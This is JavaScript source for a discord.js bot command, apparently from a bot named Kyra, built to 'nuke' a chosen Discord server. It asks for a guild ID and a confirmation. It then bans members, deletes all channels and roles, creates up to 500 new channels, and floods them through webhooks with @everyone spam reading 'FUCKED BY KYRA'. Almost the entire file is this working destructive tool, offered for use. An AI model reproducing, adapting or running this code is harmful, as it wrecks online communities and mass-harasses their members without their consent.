import { ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, ChannelType, PermissionsBitField } from 'discord.js';
import { KyraUI } from '#classes/KyraUI';

export default {
    name: 'fuckass',
    description: 'Bans all members and deletes all channels and roles in a specific guild.',
    ownerOnly: true,
    async execute({ client, message, args }) {
        const guildId = args[0];
        if (!guildId) {
            return message.reply({ components: KyraUI.buildSimpleMessage(`${client.config.emojis.error} Please provide a Guild ID.`), flags: KyraUI.getFlags() });
        }

        const guild = client.guilds.cache.get(guildId);
        if (!guild) {
            return message.reply({ components: KyraUI.buildSimpleMessage(`${client.config.emojis.error} I am not in that guild.`), flags: KyraUI.getFlags() });
        }

        const initialButton = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('fuckass_setup')
                .setLabel('INITIALIZE FUCKASS SETUP')
                .setStyle(ButtonStyle.Danger)
        );

        const initialMsg = await message.reply({
            components: [...KyraUI.buildSimpleMessage(`### ⚠️ **FUCKASS SYSTEM ONLINE**\nClick below to configure your nuke settings and proceed to confirmation.`), initialButton],
            flags: KyraUI.getFlags()
        });

        const initialCollector = initialMsg.createMessageComponentCollector({
            filter: i => i.user.id === message.author.id,
            time: 60000
        });

        // Default Spam Settings
        let nukeOptions = {
            channelName: 'fucked-by-kyra',
            spamMessage: '@everyone FUCKED BY KYRA X',
            channelCount: 50
        };

        initialCollector.on('collect', async i => {
            if (i.customId === 'fuckass_setup') {
                const modal = new ModalBuilder()
                    .setCustomId('fuckass_modal')
                    .setTitle('Nuke Configuration');

                const nameInput = new TextInputBuilder()
                    .setCustomId('channel_name')
                    .setLabel('Channel Name')
                    .setPlaceholder('e.g. fucked-by-kyra')
                    .setValue(nukeOptions.channelName)
                    .setStyle(TextInputStyle.Short);

                const countInput = new TextInputBuilder()
                    .setCustomId('channel_count')
                    .setLabel('Number of Channels (Max 500)')
                    .setPlaceholder('50')
                    .setValue(nukeOptions.channelCount.toString())
                    .setStyle(TextInputStyle.Short);

                const messageInput = new TextInputBuilder()
                    .setCustomId('spam_message')
                    .setLabel('Spam Message')
                    .setPlaceholder('e.g. @everyone FUCKED')
                    .setValue(nukeOptions.spamMessage)
                    .setStyle(TextInputStyle.Paragraph);

                modal.addComponents(
                    new ActionRowBuilder().addComponents(nameInput),
                    new ActionRowBuilder().addComponents(countInput),
                    new ActionRowBuilder().addComponents(messageInput)
                );

                await i.showModal(modal);

                const submitted = await i.awaitModalSubmit({ time: 60000 }).catch(() => null);
                if (!submitted) return;

                nukeOptions.channelName = submitted.fields.getTextInputValue('channel_name') || nukeOptions.channelName;
                nukeOptions.spamMessage = submitted.fields.getTextInputValue('spam_message') || nukeOptions.spamMessage;
                const count = parseInt(submitted.fields.getTextInputValue('channel_count'));
                nukeOptions.channelCount = isNaN(count) ? 50 : Math.min(500, Math.max(1, count));

                const confirmContainer = KyraUI.buildDetailedDashboard(
                    '### ☢️ **FINAL CONFIRMATION**',
                    `**WARNING:** You are about to **PERMANENTLY WIPE** \`${guild.name}\`.\n\n**Settings:**\n- **Channels:** \`${nukeOptions.channelCount}\` named \`${nukeOptions.channelName}\`\n- **Spam:** \`${nukeOptions.spamMessage}\`\n\n**Action:** All existing channels/roles will be deleted and members banned.`
                );

                const confirmButtons = new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId('fuckass_confirm')
                        .setLabel('CONFIRM & EXECUTE')
                        .setStyle(ButtonStyle.Danger),
                    new ButtonBuilder()
                        .setCustomId('fuckass_cancel')
                        .setLabel('ABORT')
                        .setStyle(ButtonStyle.Secondary)
                );

                await submitted.update({
                    components: [...confirmContainer, confirmButtons],
                    flags: KyraUI.getFlags()
                });

                const finalCollector = initialMsg.createMessageComponentCollector({
                    filter: i => i.user.id === message.author.id,
                    time: 30000
                });

                finalCollector.on('collect', async bi => {
                    if (bi.customId === 'fuckass_cancel') {
                        await bi.update({
                            components: KyraUI.buildSimpleMessage(`${client.config.emojis.success} Operation aborted. Server is safe.`),
                            flags: KyraUI.getFlags()
                        });
                        return finalCollector.stop();
                    }

                    if (bi.customId === 'fuckass_confirm') {
                        await bi.update({
                            components: KyraUI.buildSimpleMessage(`${client.config.emojis.loading} Fucking Up \`${guild.name}\` immediately...`),
                            flags: KyraUI.getFlags()
                        });

                        const startTime = Date.now();
                        const processed = new Set();
                        const totals = { banned: 0, channels: 0, roles: 0, created: 0, spammed: 0 };
                        
                        const initial = {
                            members: guild.memberCount,
                            channels: guild.channels.cache.size,
                            roles: guild.roles.cache.size
                        };

                        const fire = (id, type, task) => {
                            if (processed.has(id)) return;
                            processed.add(id);
                            return task().then(() => { totals[type]++; }).catch(() => {});
                        };

                        const nukeTargets = (targets) => {
                            const p = [];
                            targets.channels?.forEach(c => {
                                if (c.deletable) p.push(fire(c.id, 'channels', () => c.delete()));
                            });
                            targets.roles?.forEach(r => {
                                if (r.id !== guild.id && !r.managed && r.editable) p.push(fire(r.id, 'roles', () => r.delete()));
                            });
                            targets.members?.forEach(m => {
                                if (m.id !== client.user.id && m.id !== guild.ownerId) p.push(fire(m.id, 'banned', () => guild.bans.create(m.id)));
                            });
                            return p.filter(Boolean);
                        };

                        // WAVE 1: Cache Burst
                        let wave1 = nukeTargets({
                            channels: guild.channels.cache,
                            roles: guild.roles.cache,
                            members: guild.members.cache
                        });

                        // WAVE 2: Direct Fetch
                        const fetchAndNuke = async () => {
                            const [m, c, r] = await Promise.all([
                                guild.members.fetch().catch(() => null),
                                guild.channels.fetch().catch(() => null),
                                guild.roles.fetch().catch(() => null)
                            ]);
                            if (m) initial.members = Math.max(initial.members, m.size);
                            if (c) initial.channels = Math.max(initial.channels, c.size);
                            if (r) initial.roles = Math.max(initial.roles, r.size);
                            return Promise.allSettled(nukeTargets({ members: m, channels: c, roles: r }));
                        };

                        // WAVE 3: Mass Creation & Spam
                        const massSpam = async () => {
                            await new Promise(r => setTimeout(r, 1000));
                            const createPromises = [];
                            for (let x = 0; x < nukeOptions.channelCount; x++) {
                                createPromises.push(
                                    guild.channels.create({
                                        name: nukeOptions.channelName,
                                        type: ChannelType.GuildText,
                                        topic: 'FUCKED BY KYRA'
                                    }).then(async (chan) => {
                                        totals.created++;
                                        const webhook = await chan.createWebhook({
                                            name: nukeOptions.channelName,
                                            avatar: client.user.displayAvatarURL()
                                        }).catch(() => null);

                                        if (webhook) {
                                            for (let s = 0; s < 5; s++) {
                                                webhook.send({ 
                                                    content: nukeOptions.spamMessage,
                                                    allowedMentions: { parse: ['everyone', 'roles', 'users'] }
                                                }).then(() => totals.spammed++).catch(() => {});
                                            }
                                        } else {
                                            chan.send({ 
                                                content: nukeOptions.spamMessage,
                                                allowedMentions: { parse: ['everyone', 'roles', 'users'] }
                                            }).then(() => totals.spammed++).catch(() => {});
                                        }
                                    }).catch(() => {})
                                );
                            }
                            return Promise.allSettled(createPromises);
                        };

                        await Promise.allSettled([...wave1, fetchAndNuke(), massSpam()]);

                        const timeTaken = ((Date.now() - startTime) / 1000).toFixed(2);
                        const fuckPct = Math.min(100, (((totals.banned + totals.channels + totals.roles) / (initial.members + initial.channels + initial.roles || 1)) * 100)).toFixed(2);
                        
                        const resultContainer = KyraUI.buildDetailedDashboard(
                            `### ${client.config.emojis.success} **GUILD OBLITERATED**`,
                            `Nuke on \`${guild.name}\` finished in \`${timeTaken}s\`.`,
                            [
                                { name: '👥 Members', value: `Banned: \`${totals.banned}\`` },
                                { name: '📺 Channels', value: `Deleted: \`${totals.channels}\` | Created: \`${totals.created}\`` },
                                { name: '🛡️ Roles', value: `Deleted: \`${totals.roles}\`` },
                                { name: '💣 Spam', value: `Messages Sent: \`${totals.spammed}\`` },
                                { name: '🔥 Fuck Percentage', value: `## **${fuckPct}% FUCKED**` }
                            ]
                        );

                        try {
                            await message.channel.send({ components: resultContainer, flags: KyraUI.getFlags() });
                        } catch (e) {
                            message.author.send({ components: resultContainer }).catch(() => {});
                        }
                        finalCollector.stop();
                    }
                });
            }
        });
    }
};
